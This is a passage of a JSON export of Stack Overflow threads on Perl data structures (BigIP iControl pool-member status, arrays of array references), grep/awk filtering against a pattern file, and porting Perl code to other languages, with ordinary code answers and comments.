=&gt; bless( {\n                                             'address' =&gt; '192.168.100.143',\n                                             'port' =&gt; '80'\n                                           }, 'Common::IPPortDefinition' ),\n                          'object_status' =&gt; bless( {\n                                                    'availability_status' =&gt; 'AVAILABILITY_STATUS_GREEN',\n                                                    'status_description' =&gt; 'Pool member is available',\n                                                    'enabled_status' =&gt; 'ENABLED_STATUS_ENABLED'\n                                                  }, 'LocalLB::ObjectStatus' )\n                        }, 'LocalLB::PoolMember::MemberObjectStatus' ),\n                 bless( {\n                          'member' =&gt; bless( {\n                                             'address' =&gt; '192.168.100.144',\n                                             'port' =&gt; '80'\n                                           }, 'Common::IPPortDefinition' ),\n                          'object_status' =&gt; bless( {\n                                                    'availability_status' =&gt; 'AVAILABILITY_STATUS_GREEN',\n                                                    'status_description' =&gt; 'Pool member is available',\n                                                    'enabled_status' =&gt; 'ENABLED_STATUS_ENABLED'\n                                                  }, 'LocalLB::ObjectStatus' )\n                        }, 'LocalLB::PoolMember::MemberObjectStatus' )\n               ], 'LocalLB::PoolMember::MemberObjectStatus[]' )\n      ]\n    ];\n\nprint Dumper($obj-&gt;[0]-&gt;[0]-&gt;[0]-&gt;{member}-&gt;{address});\nprint Dumper($obj-&gt;[0]-&gt;[0]-&gt;[0]-&gt;{object_status}-&gt;{availability_status});\nprint Dumper($obj-&gt;[0]-&gt;[0]-&gt;[1]-&gt;{member}-&gt;{address});\nprint Dumper($obj-&gt;[0]-&gt;[0]-&gt;[1]-&gt;{object_status}-&gt;{availability_status});\nprint Dumper($obj-&gt;[0]-&gt;[0]-&gt;[2]-&gt;{member}-&gt;{address});\nprint Dumper($obj-&gt;[0]-&gt;[0]-&gt;[2]-&gt;{object_status}-&gt;{availability_status});\nprint Dumper($obj-&gt;[0]-&gt;[0]-&gt;[3]-&gt;{member}-&gt;{address});\nprint Dumper($obj-&gt;[0]-&gt;[0]-&gt;[3]-&gt;{object_status}-&gt;{availability_status});\n</code></pre>\n\n<p><strong>Output:</strong></p>\n\n<pre><code>$VAR1 = '192.168.100.141';\n$VAR1 = 'AVAILABILITY_STATUS_GREEN';\n$VAR1 = '192.168.100.142';\n$VAR1 = 'AVAILABILITY_STATUS_GREEN';\n$VAR1 = '192.168.100.143';\n$VAR1 = 'AVAILABILITY_STATUS_GREEN';\n$VAR1 = '192.168.100.144';\n$VAR1 = 'AVAILABILITY_STATUS_GREEN';\n</code></pre>\n\n<p>Hope this helps and now you should be able to traverse this data structure with loops.</p>\n"}], "owner": {"reputation": 133, "user_id": 1307468, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/015661ce54752b6400a406db785c2fed?s=128&d=identicon&r=PG", "display_name": "harp", "link": "https://stackoverflow.com/users/1307468/harp"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 131, "favorite_count": 1, "accepted_answer_id": 37961909, "answer_count": 1, "score": 1, "last_activity_date": 1466596243, "creation_date": 1466518496, "last_edit_date": 1466596243, "question_id": 37946882, "link": "https://stackoverflow.com/questions/37946882/perl-accessing-and-handling-objects-in-an-array", "title": "Perl: Accessing and handling objects in an array", "body": "<p>I try to handle the following Array which was generated by <code>get_pool_member_object_status_($pool)</code></p>\n\n<p>from <a href=\"http://search.cpan.org/~ltp/BigIP-iControl/lib/BigIP/iControl.pm#get_pool_member_object_status_($pool)\" rel=\"nofollow\">http://search.cpan.org/~ltp/BigIP-iControl/lib/BigIP/iControl.pm#get_pool_member_object_status_($pool)</a></p>\n\n<pre><code>$VAR1 = [\n      [\n        bless( [\n                 bless( {\n                          'member' =&gt; bless( {\n                                             'address' =&gt; '192.168.100.141',\n                                             'port' =&gt; '80'\n                                           }, 'Common::IPPortDefinition' ),\n                          'object_status' =&gt; bless( {\n                                                    'availability_status' =&gt; 'AVAILABILITY_STATUS_GREEN',\n                                                    'status_description' =&gt; 'Pool member is available',\n                                                    'enabled_status' =&gt; 'ENABLED_STATUS_ENABLED'\n                                                  }, 'LocalLB::ObjectStatus' )\n                        }, 'LocalLB::PoolMember::MemberObjectStatus' ),\n                 bless( {\n                          'member' =&gt; bless( {\n                                             'address' =&gt; '192.168.100.142',\n                                             'port' =&gt; '80'\n                                           }, 'Common::IPPortDefinition' ),\n                          'object_status' =&gt; bless( {\n                                                    'availability_status' =&gt; 'AVAILABILITY_STATUS_GREEN',\n                                                    'status_description' =&gt; 'Pool member is available',\n                                                    'enabled_status' =&gt; 'ENABLED_STATUS_ENABLED'\n                                                  }, 'LocalLB::ObjectStatus' )\n                        }, 'LocalLB::PoolMember::MemberObjectStatus' ),\n                 bless( {\n                          'member' =&gt; bless( {\n                                             'address' =&gt; '192.168.100.143',\n                                             'port' =&gt; '80'\n                                           }, 'Common::IPPortDefinition' ),\n                          'object_status' =&gt; bless( {\n                                                    'availability_status' =&gt; 'AVAILABILITY_STATUS_GREEN',\n                                                    'status_description' =&gt; 'Pool member is available',\n                                                    'enabled_status' =&gt; 'ENABLED_STATUS_ENABLED'\n                                                  }, 'LocalLB::ObjectStatus' )\n                        }, 'LocalLB::PoolMember::MemberObjectStatus' ),\n                 bless( {\n                          'member' =&gt; bless( {\n                                             'address' =&gt; '192.168.100.144',\n                                             'port' =&gt; '80'\n                                           }, 'Common::IPPortDefinition' ),\n                          'object_status' =&gt; bless( {\n                                                    'availability_status' =&gt; 'AVAILABILITY_STATUS_GREEN',\n                                                    'status_description' =&gt; 'Pool member is available',\n                                                    'enabled_status' =&gt; 'ENABLED_STATUS_ENABLED'\n                                                  }, 'LocalLB::ObjectStatus' )\n                        }, 'LocalLB::PoolMember::MemberObjectStatus' )\n               ], 'LocalLB::PoolMember::MemberObjectStatus[]' )\n      ]\n    ];\n</code></pre>\n\n<p>I couldn't figure out how this should work. I tried several examples from perldsc. The examples there mostly concern ARRAYS OF HASHES. But the above array is...? I don't even know what kind of array this is. Can someone point me in the right direction?</p>\n\n<p>So for example how do I access the <code>\"object_status\"-&gt;\"availability_status\"</code> of a  <code>\"member\"-&gt;\"address\"</code></p>\n\n<p>Thx simbabque. This is the output I get from <code>Data::Printer:</code></p>\n\n<pre><code>[\n[0] [\n    [0] LocalLB::PoolMember::MemberObjectStatus[]  {\n        public methods (0)\n        private methods (0)\n        internals: [\n            [0] LocalLB::PoolMember::MemberObjectStatus,\n            [1] LocalLB::PoolMember::MemberObjectStatus,\n            [2] LocalLB::PoolMember::MemberObjectStatus,\n            [3] LocalLB::PoolMember::MemberObjectStatus\n        ]\n    }\n]\n</code></pre>\n\n<p>]</p>\n"}, {"tags": ["linux", "perl", "sed", "grep", "csh"], "answers": [{"comments": [{"owner": {"reputation": 1413, "user_id": 2463642, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/5ed23d0987aa375079002e8e074306ca?s=128&d=identicon&r=PG", "display_name": "MaMazav", "link": "https://stackoverflow.com/users/2463642/mamazav"}, "edited": false, "score": 0, "creation_date": 1466530373, "post_id": 37946596, "comment_id": 63350539, "body": "It works. However the performance are bad (which is critical, as my files are huge (e.g. 1000 lines in pattern file and 21 millions of lines in input file). I guess that preloading of the pattern file instead of using index function every iteration may improve performance."}], "tags": [], "owner": {"reputation": 3089, "user_id": 6165935, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-5SjwIcK5M8I/AAAAAAAAAAI/AAAAAAAAAFQ/xyQQHb_jXoQ/photo.jpg?sz=128", "display_name": "Michael Vehrs", "link": "https://stackoverflow.com/users/6165935/michael-vehrs"}, "is_accepted": true, "score": 1, "last_activity_date": 1466517700, "creation_date": 1466517700, "answer_id": 37946596, "question_id": 37945562, "link": "https://stackoverflow.com/questions/37945562/grep-filtering-with-both-pattern-and-input-file/37946596#37946596", "title": "grep filtering with both pattern and input file", "body": "<p>You could do it with <code>awk</code>:</p>\n\n<pre><code>NR==FNR { pattern[NR]= $0; count++; next }\n/^[$#]/ { print ; next }\n{\n    for (i = 1; i &lt;= count; i++) {\n        if (index($0, pattern[i]) &gt; 0) {\n            print; next;\n        }\n    }\n}\n</code></pre>\n\n<p>Alternatively, you could process your pattern file and quote all regex meta-characters.</p>\n"}, {"tags": [], "owner": {"reputation": 1652, "user_id": 2678246, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6ff985eff214bdd3126700c60812ae20?s=128&d=identicon&r=PG&f=1", "display_name": "edi_allen", "link": "https://stackoverflow.com/users/2678246/edi-allen"}, "is_accepted": false, "score": 1, "last_activity_date": 1466522352, "creation_date": 1466522352, "answer_id": 37948402, "question_id": 37945562, "link": "https://stackoverflow.com/questions/37945562/grep-filtering-with-both-pattern-and-input-file/37948402#37948402", "title": "grep filtering with both pattern and input file", "body": "<p>You could quote the special characters in your first pattern file and pass the second pattern file unaltered.</p>\n\n<pre><code> grep -f &lt;(perl -p -e \"s#([\\^\\*])#\\\\\\\\\\1#g\" pattern_file.tx) -f extra_patterns.txt input_file.txt\n</code></pre>\n\n<p>This sample command will just quote <code>^</code> and <code>*</code>. It is easy to add other metacharacters if required.</p>\n"}, {"tags": [], "owner": {"reputation": 1413, "user_id": 2463642, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/5ed23d0987aa375079002e8e074306ca?s=128&d=identicon&r=PG", "display_name": "MaMazav", "link": "https://stackoverflow.com/users/2463642/mamazav"}, "is_accepted": false, "score": 1, "last_activity_date": 1466755957, "last_edit_date": 1492086987, "creation_date": 1466583912, "answer_id": 37962490, "question_id": 37945562, "link": "https://stackoverflow.com/questions/37945562/grep-filtering-with-both-pattern-and-input-file/37962490#37962490", "title": "grep filtering with both pattern and input file", "body": "<p>Finally solved it according to other's suggestions - by processing the pattern file and escaping any meta chars. Writing it down here as I found this to be the full and performant solution:</p>\n\n<pre><code>sed -e 's/\\([\\.\\^\\*\\[\\$\\\\]\\)/\\\\\\1/g' -e 's/]/\\\\\\]/g'  pattern_file.txt &gt; new_pattern_file.txt\necho '^\\#' &gt;&gt; new_pattern_file.txt\necho '^\\$' &gt;&gt; new_pattern_file.txt\n</code></pre>\n\n<p>Then I can use grep:</p>\n\n<pre><code>grep -f new_pattern_file.txt input_file.txt\n</code></pre>\n\n<p>Here are more details about lists of chars should be escaped:\n<a href=\"https://unix.stackexchange.com/questions/32355/escaping-of-meta-characters-in-basic-extended-posix-regex-strings-in-grep\">https://unix.stackexchange.com/questions/32355/escaping-of-meta-characters-in-basic-extended-posix-regex-strings-in-grep</a></p>\n"}], "owner": {"reputation": 1413, "user_id": 2463642, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/5ed23d0987aa375079002e8e074306ca?s=128&d=identicon&r=PG", "display_name": "MaMazav", "link": "https://stackoverflow.com/users/2463642/mamazav"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1050, "favorite_count": 0, "accepted_answer_id": 37946596, "answer_count": 3, "score": 1, "last_activity_date": 1466755957, "creation_date": 1466515011, "last_edit_date": 1466515793, "question_id": 37945562, "link": "https://stackoverflow.com/questions/37945562/grep-filtering-with-both-pattern-and-input-file", "title": "grep filtering with both pattern and input file", "body": "<p>I have an input file which looks like:</p>\n\n<pre><code>$Interesting line\n$Interesting line 2\n#Also interesting line\nNon interesting line - filter out\n$another interesting line\nInteresting line contains FiRsT pattern\nAnother non interesting line\nInteresting line contains sec\"o^nd pattern\n#Interesting line\n</code></pre>\n\n<p>I have another pattern file, which contains patterns I would like to filter (notice that the pattern file may contain problematic chars - I would like to refer them as simple chars and not wildcard / regex):</p>\n\n<pre><code>FiRsT\nsec\"o^nd\n</code></pre>\n\n<p>I would like to have the following result:</p>\n\n<pre><code>$Interesting line\n$Interesting line 2\n#Also interesting line\n$another interesting line\nInteresting line contains FiRsT pattern\nInteresting line contains sec\"o^nd pattern\n#Interesting line\n</code></pre>\n\n<p>That is, the following two lines were filtered out:</p>\n\n<pre><code>Non interesting line - filter out\nAnother non interesting line\n</code></pre>\n\n<p>More precisely, I would like to have in the result file all lines contain any string of the pattern file OR lines starts with # or $ (order is important).</p>\n\n<p>I know how to filter the strings from the pattern file:</p>\n\n<pre><code>grep -F -f pattern_file.txt input_file.txt\n</code></pre>\n\n<p>and I know how to filter all lines start with $ and #:</p>\n\n<pre><code>grep '^\\$\\|^#' input_file.txt\n</code></pre>\n\n<p>But how should I do both? Is the only way is to write a short sub-script for that, or may I still use simple grep/sed/whatever standard linux commands?</p>\n\n<p>Again, remember that:</p>\n\n<ul>\n<li>Order of lines is important and must match the original input file order.</li>\n<li>Pattern file may contain problematic chars, I would like to refer them as regular chars (and not wildcards / regex).</li>\n</ul>\n\n<p><strong>Edit</strong>: Consider the following case:</p>\n\n<p>Input file contains also</p>\n\n<pre><code>Interesting line with ^third pattern\n</code></pre>\n\n<p>Pattern file contains</p>\n\n<pre><code>^third\n</code></pre>\n\n<p>Of course, I would like that line to be in the result file. That's why I cannot refer the pattern file without -F flag, and cannot just add ^\\$ and ^# lines to it.</p>\n"}, {"tags": ["perl"], "comments": [{"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 1, "creation_date": 1466505343, "post_id": 37941947, "comment_id": 63332865, "body": "What do you mean by fast? Faster to write or faster to run?"}, {"owner": {"reputation": 99, "user_id": 5825707, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/01671dae7d225e96fd680d0b0d7d3892?s=128&d=identicon&r=PG", "display_name": "user30771", "link": "https://stackoverflow.com/users/5825707/user30771"}, "reply_to_user": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 1, "creation_date": 1466505473, "post_id": 37941947, "comment_id": 63332942, "body": "Faster to run, i guess"}, {"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 1, "creation_date": 1466505749, "post_id": 37941947, "comment_id": 63333116, "body": "Why do you need it fast? How many elements are in your array? How complex is the operation you are going to do? <a href=\"http://c2.com/cgi/wiki?RulesOfOptimization\" rel=\"nofollow noreferrer\">The first rule of optimization is don&#39;t do it.</a>"}, {"owner": {"reputation": 99, "user_id": 5825707, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/01671dae7d225e96fd680d0b0d7d3892?s=128&d=identicon&r=PG", "display_name": "user30771", "link": "https://stackoverflow.com/users/5825707/user30771"}, "reply_to_user": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 0, "creation_date": 1466506070, "post_id": 37941947, "comment_id": 63333319, "body": "I have a hash with about 30 keys. The values of those keys are arrays with aprox 30 elements. I don&#39;t necessary need it, i just want to know it. Are there fastest ways?"}, {"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 6, "creation_date": 1466506267, "post_id": 37941947, "comment_id": 63333440, "body": "Fast always depends on the specs of your machine (that includes memory, CPU speed, speed of disks), on the code you run, on the availability of resources (CPU load, other programs running at the same time, disk i/o, ...) and possibly on a lot of other factors. You can <a href=\"http://blogs.perl.org/users/steffen_mueller/2010/09/your-benchmarks-suck.html\" rel=\"nofollow noreferrer\">benchmark</a> your code against other implementations, but that will only tell you about the results at that particular time on your machine. For this specific question, a loop is a loop. You have to iterate all elements. There is no way around that."}], "answers": [{"comments": [{"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 7, "creation_date": 1466506316, "post_id": 37942352, "comment_id": 63333471, "body": "This is probably <i>faster to write</i>, but <i>not necessarily faster to read</i>."}], "tags": [], "owner": {"reputation": 5923, "user_id": 2105156, "user_type": "registered", "accept_rate": 76, "profile_image": "https://i.stack.imgur.com/oRMc0.jpg?s=128&g=1", "display_name": "fugu", "link": "https://stackoverflow.com/users/2105156/fugu"}, "is_accepted": false, "score": 4, "last_activity_date": 1466507256, "last_edit_date": 1466507256, "creation_date": 1466506089, "answer_id": 37942352, "question_id": 37941947, "link": "https://stackoverflow.com/questions/37941947/fastest-way-to-modify-array-values/37942352#37942352", "title": "Fastest way to modify array values?", "body": "<p>A <em>shorter</em> way of writing the same thing: </p>\n\n<pre><code>s/\\.[^.]+$// foreach @array;\n</code></pre>\n"}], "owner": {"reputation": 99, "user_id": 5825707, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/01671dae7d225e96fd680d0b0d7d3892?s=128&d=identicon&r=PG", "display_name": "user30771", "link": "https://stackoverflow.com/users/5825707/user30771"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 730, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1466521858, "creation_date": 1466504937, "question_id": 37941947, "link": "https://stackoverflow.com/questions/37941947/fastest-way-to-modify-array-values", "title": "Fastest way to modify array values?", "body": "<p>Is there a faster way  ( faster than foreach) to modify each value of an array?</p>\n\n<pre><code>my @array = ( 'file1.c', 'file2.h', 'file3.py');\nforeach ( my $elemeny ( @array)) {\n    #remove extension\n}\n</code></pre>\n"}, {"tags": ["perl"], "comments": [{"owner": {"reputation": 198290, "user_id": 1030675, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/957956ce51706d03f19a4dc85a767bb1?s=128&d=identicon&r=PG", "display_name": "choroba", "link": "https://stackoverflow.com/users/1030675/choroba"}, "edited": false, "score": 1, "creation_date": 1466498283, "post_id": 37939330, "comment_id": 63327927, "body": "Use <a href=\"http://p3rl.org/Data::Dumper\" rel=\"nofollow noreferrer\">Data::Dumper</a> to inspect data structures."}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 1, "creation_date": 1466499820, "post_id": 37939330, "comment_id": 63328957, "body": "I dont&#39; quite understand what you are asking You <i>are</i> accessing all elements -- looping through the top-level array, and printing out arrays whose refs are its elements. Instead of printing <code>@$array_ref</code> summarily, run a loop over it and you&#39;ll see exactly what is what. You&#39;ve got everything right in the code you show, I&#39;d suggest just play with it a little more. A good resource is <a href=\"http://perldoc.perl.org/perldsc.html\" rel=\"nofollow noreferrer\"><code>perldsc</code></a>, and of course <a href=\"http://perldoc.perl.org/perlreftut.html\" rel=\"nofollow noreferrer\"><code>perlreftut</code></a> and <a href=\"http://perldoc.perl.org/perlref.html\" rel=\"nofollow noreferrer\"><code>perlref</code></a>."}, {"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 0, "creation_date": 1466500082, "post_id": 37939330, "comment_id": 63329125, "body": "In addition to the above comment, you need to know that doing <code>print &quot;@array&quot;</code> will convert all elements of <code>@array</code> to a string. It&#39;s like a <code>join(&#39; &#39;, @array)</code> (where the <code>&#39; &#39;</code> is really the content of <code>$&quot;</code>, but that&#39;s not really important right now). So it&#39;s not a string, you just turn it into one through the way you output it. You also make a copy of the reference in your <code>query</code> sub because you don&#39;t have <code>my</code> in front of <code>$array_ref = $sth-&gt;fetchrow_arrayref</code>, which reuses the same variable, and then deref and ref it with <code>[ @$array_ref ]</code>. Do <code>my $res</code> and <code>push @sub_stash, $res</code>."}], "answers": [{"tags": [], "owner": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "is_accepted": true, "score": 6, "last_activity_date": 1466500406, "creation_date": 1466500406, "answer_id": 37940162, "question_id": 37939330, "link": "https://stackoverflow.com/questions/37939330/perl-handling-arrays-and-array-references/37940162#37940162", "title": "Perl: Handling arrays and array references", "body": "<p>Your <code>@stash</code> array contains ten array references. Each of the referenced arrays will contain five elements (one from each of the columns in the query).</p>\n\n<p>You can verify this by using <a href=\"https://metacpan.org/pod/Data::Dumper\">Data::Dumper</a>.</p>\n\n<pre><code>print Dumper(\\@stash);\n</code></pre>\n\n<p>You can access individual elements of the sub-arrays using two sets of array-lookup brackets.</p>\n\n<pre><code>print $stash[0][0]; # prints 2007\nprint $stash[9][4]; # prints 24\n</code></pre>\n\n<p>Or you can print individual elements from the array within your loop.</p>\n\n<pre><code>foreach my $array_ref ( @stash ) {\n    print \"$array_ref-&gt;[0]\\n\"; # prints the first element (i.e. the year)\n} \n</code></pre>\n\n<p>For more details on dealing with these data structures, see <a href=\"http://perldoc.perl.org/perllol.html\">perllol</a> and <a href=\"http://perldoc.perl.org/perldsc.html\">perldsc</a>.</p>\n"}], "owner": {"reputation": 295, "user_id": 4114453, "user_type": "registered", "accept_rate": 79, "profile_image": "https://www.gravatar.com/avatar/e8d81cdda00ea27de65abb457245e7f7?s=128&d=identicon&r=PG&f=1", "display_name": "Ga Mmeeu", "link": "https://stackoverflow.com/users/4114453/ga-mmeeu"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 326, "favorite_count": 2, "accepted_answer_id": 37940162, "answer_count": 1, "score": 5, "last_activity_date": 1466500406, "creation_date": 1466498007, "last_edit_date": 1466500093, "question_id": 37939330, "link": "https://stackoverflow.com/questions/37939330/perl-handling-arrays-and-array-references", "title": "Perl: Handling arrays and array references", "body": "<p>I am a Perl newbie and I am currently learning how Perl handles multi-dimensional arrays and how I can access the elements.</p>\n\n<p>A database query is executed in a subroutine, and return the array @stash:</p>\n\n<pre><code>...\nwhile ( $array_ref = $sth-&gt;fetchrow_arrayref ) {\n        push @sub_stash, [ @$array_ref ];\n    }\n\n$dbh-&gt;disconnect;\nreturn ( @sub_stash );\n</code></pre>\n\n<p>@stash is received in the main, and manage to print the contents of the array as follows:</p>\n\n<pre><code>@stash = query($var);\n\n### Dump the stash contents!\nforeach my $array_ref ( @stash ) {\n    print \"@$array_ref\\n\";\n} \n</code></pre>\n\n<p>An example of the screen output is as follows:</p>\n\n<pre><code>bash-3.2$ ./test_db_array.pl\n2007 123 200728 200753 26\n2008 256 200800 200852 53\n2009 256 200900 200952 53\n2010 258 201001 201052 52\n2011 257 201101 201152 52\n2012 256 201201 201253 53\n2013 255 201300 201352 53\n2014 254 201400 201452 53\n2015 256 201500 201552 53\n2016 116 201601 201624 24\nbash-3.2$\n</code></pre>\n\n<p>Does @stash contain 10 rows by 5 columns, or does it contain 10 rows by 1 column (composing of a line of text)?  How can I figure this out ? </p>\n\n<p>In the development of my little program, I wish to loop through the year column (first column of the array), and print the year.</p>\n\n<p>How can I access a specific element, for instance row 3 -- column 4?</p>\n"}, {"tags": ["python", "node.js", "perl"], "comments": [{"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 0, "creation_date": 1466497130, "post_id": 37938870, "comment_id": 63327216, "body": "You can run both Python as well as JavaScript inside of Perl, as part of the Perl program. That might not be the fastest, but could work. Otherwise, you&#39;ll need to define clear interfaces and make different programs talk to each other. This is however a bit broad for Stack Overflow. You might get a good answer on programmers.se if you rephrase the question to something along the lines of &quot;what strategy can I employ to port an application from language 1 to language 2 step by step while keeping it in production&quot; and then go into details."}, {"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 2, "creation_date": 1466497228, "post_id": 37938870, "comment_id": 63327280, "body": "Oh btw, why do you consider Perl not modern? :P"}, {"owner": {"reputation": 1595, "user_id": 5276890, "user_type": "registered", "accept_rate": 86, "profile_image": "https://i.stack.imgur.com/VfQC8.jpg?s=128&g=1", "display_name": "Roy Falk", "link": "https://stackoverflow.com/users/5276890/roy-falk"}, "reply_to_user": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 0, "creation_date": 1466497655, "post_id": 37938870, "comment_id": 63327534, "body": "I admit my judgement of &#39;modern&#39; is very subjective. Perl has fallen from favour a few years ago and I found it to be very &#39;beginner unfriendly&#39;. I also don&#39;t like the lack of function prototypes. Mostly, people today don&#39;t use it, so new team members have to learn it or be recruited for it (which is harder than for python/node)."}, {"owner": {"reputation": 1595, "user_id": 5276890, "user_type": "registered", "accept_rate": 86, "profile_image": "https://i.stack.imgur.com/VfQC8.jpg?s=128&g=1", "display_name": "Roy Falk", "link": "https://stackoverflow.com/users/5276890/roy-falk"}, "reply_to_user": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 0, "creation_date": 1466497737, "post_id": 37938870, "comment_id": 63327577, "body": "Writing inline was what I was looking for. There&#39;s an answer for python but how does one write node inline?"}, {"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 0, "creation_date": 1466497752, "post_id": 37938870, "comment_id": 63327584, "body": "I agree with the part about recruiting and finding developers. I don&#39;t think it&#39;s beginner unfriendly though, we merely suck at marketing it big time. :) But this will quickly go very off-topic, so I say we don&#39;t discuss this here. I meant that comment more as a jest. ;)"}, {"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 0, "creation_date": 1466497783, "post_id": 37938870, "comment_id": 63327602, "body": "Well there&#39;s <a href=\"https://metacpan.org/pod/JavaScript\" rel=\"nofollow noreferrer\">metacpan.org/pod/JavaScript</a>."}, {"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 0, "creation_date": 1466497930, "post_id": 37938870, "comment_id": 63327702, "body": "Or with a Perl6 VM. But that is going to be very experimental. And inlining will not be the most performant thing anyway. Do you want to do this in a step-by-step way where every step gets released to production? Will there also be developers working on new features on the same product at the same time? Or are you fine with a complete rewrite and replacement when it&#39;s done? How big is the project?"}, {"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 0, "creation_date": 1466498048, "post_id": 37938870, "comment_id": 63327769, "body": "There is also <a href=\"https://www.npmjs.com/package/perl\" rel=\"nofollow noreferrer\">npmjs.com/package/perl</a>, which seems to be the other way around, though I highly doubt this is really inlined."}, {"owner": {"reputation": 1595, "user_id": 5276890, "user_type": "registered", "accept_rate": 86, "profile_image": "https://i.stack.imgur.com/VfQC8.jpg?s=128&g=1", "display_name": "Roy Falk", "link": "https://stackoverflow.com/users/5276890/roy-falk"}, "reply_to_user": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 0, "creation_date": 1466498363, "post_id": 37938870, "comment_id": 63327970, "body": "It&#39;s a very large project and beyond my grokking. I&#39;m currently touching one small part of it and exploring an idea of  making that relevant part accessible to others without the pain I went through. Other strategies such as Perl6 or full porting are no go. It needs to be limited in scope and time."}, {"owner": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "edited": false, "score": 3, "creation_date": 1466498848, "post_id": 37938870, "comment_id": 63328306, "body": "Perl now has what I assume you mean by <a href=\"http://www.effectiveperlprogramming.com/2015/04/use-v5-20-subroutine-signatures/\" rel=\"nofollow noreferrer\">function 